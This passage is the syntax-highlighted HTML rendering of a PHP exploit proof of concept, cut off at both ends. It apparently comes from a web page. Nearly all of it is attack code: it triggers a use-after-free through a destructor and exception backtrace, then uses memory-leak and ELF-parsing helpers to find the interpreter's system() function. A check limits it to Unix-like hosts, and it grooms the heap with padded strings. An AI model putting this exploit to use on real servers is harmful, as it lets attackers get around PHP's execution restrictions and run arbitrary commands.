punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>                <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="74"></td><td><pre>                <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="77"></td><td><pre></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>                </pre></td></tr><tr><td data-num="91"></td><td><pre>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="92"></td><td><pre>                    <span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="96"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>                </pre></td></tr><tr><td data-num="99"></td><td><pre>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="100"></td><td><pre>                    <span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="102"></td><td><pre></pre></td></tr><tr><td data-num="103"></td><td><pre>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="106"></td><td><pre></pre></td></tr><tr><td data-num="107"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="108"></td><td><pre>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="113"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="114"></td><td><pre>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="118"></td><td><pre></pre></td></tr><tr><td data-num="119"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="120"></td><td><pre>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="121"></td><td><pre>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="122"></td><td><pre>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre></pre></td></tr><tr><td data-num="125"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="126"></td><td><pre>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="127"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="128"></td><td><pre>            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="129"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="131"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="132"></td><td><pre></pre></td></tr><tr><td data-num="133"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="134"></td><td><pre></pre></td></tr><tr><td data-num="135"></td><td><pre>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="136"></td><td><pre>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="137"></td><td><pre>        <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="139"></td><td><pre></pre></td></tr><tr><td data-num="140"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="141"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="142"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="143"></td><td><pre></pre></td></tr><tr><td data-num="144"></td><td><pre>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="145"></td><td><pre>    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="148"></td><td><pre></pre></td></tr><tr><td 